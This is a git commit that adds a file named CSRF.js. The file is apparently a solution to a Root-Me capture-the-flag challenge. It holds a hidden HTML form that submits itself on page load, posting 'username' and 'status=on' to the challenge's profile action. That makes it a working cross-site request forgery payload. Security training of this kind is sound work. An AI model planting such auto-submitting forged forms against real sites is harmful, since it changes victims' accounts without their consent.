dba5ba09351f1c3b01103465bf0f7ec2f2b7980b
hardek96 <35901268+hardek96@users.noreply.github.com>
2020-04-07 00:43:45 +0200

    Create CSRF.js

---
+++ CSRF.js
@@ -0,0 +1,10 @@
+<form id="form" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="post">
+  <input type="hidden"
+      name="username"
+      value="hello"/>
+  <input type="hidden"
+      name="status"
+      value="on"/>
+  
+</form>
+<script>document.getElementById("form").submit();</script>
